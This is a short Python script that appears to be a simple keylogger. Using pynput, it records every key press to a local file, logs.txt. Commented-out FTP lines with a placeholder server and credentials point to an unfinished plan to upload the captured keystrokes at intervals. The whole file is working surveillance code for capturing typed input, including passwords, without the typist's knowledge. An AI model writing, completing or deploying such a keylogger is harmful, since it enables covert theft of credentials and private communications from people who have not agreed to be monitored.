# import libraries
from pynput import keyboard
from ftplib import FTP
import datetime
import threading


# FTP Configurations
#send_file_every = 1800  # This is the time in seconds, can be changed
#ftp = FTP('server.ip')
#ftp.login(user='username', passwd='123')


# This will be what logs the keys that are pressed, in addition to writing it to a file
def keypressed(key):
    print(str(key))
    with open('logs.txt', 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            return("Error")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
